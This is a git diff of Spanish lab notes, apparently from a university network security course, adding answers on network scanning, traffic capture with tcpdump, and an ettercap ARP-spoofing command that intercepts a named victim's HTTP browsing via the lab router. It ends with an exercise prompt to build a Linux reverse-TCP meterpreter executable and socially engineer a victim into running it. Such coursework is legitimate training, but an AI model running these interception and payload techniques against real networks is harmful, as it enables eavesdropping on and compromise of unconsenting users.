@@ -101,7 +101,7 @@ nmap -sP 10.11.48.0/23
 ```
 - Con nast:
 ```
-nast -m
+nast -m -i ens33
 ```
 ***d) Obtenga la relación de las direcciones IPv6 de su segmento***
 
@@ -124,9 +124,28 @@ Mostrar direcciones vivas en segmento:
 atk6-alive6 ens33
 ```
 
+***e) Obtenga el tráfico de entrada y salida legítimo de su interface de red ens33 e investigue los servicios, conexiones y protocolos involucrados.***
+
+```
+sudo apt-get install tcpdump
+```
+
+```
+tcpdump -w apartado_e -i ens33
+```
 
 
+***f) Mediante arpspoofing entre una máquina objetivo (víctima) y el router del laboratorio obtenga todas las URL HTTP visitadas por la víctima.***
 
+```
+ettercap -Tq -M arp:remote -P remote_browser /IP Alex// /10.11.48.1// -w /home/lsi/Descargas/apartado_f
+```
+
+- Desde el wireshark:
+
+Statistics > HTTP > Requests:
+
+***g) Instale metasploit. Haga un ejecutable que incluya un Reverse TCP meterpreter payload para plataformas linux. Inclúyalo en un filtro ettercap y aplique toda su sabiduría en ingeniería social para que una víctima u objetivo lo ejecute.***
 
 
 
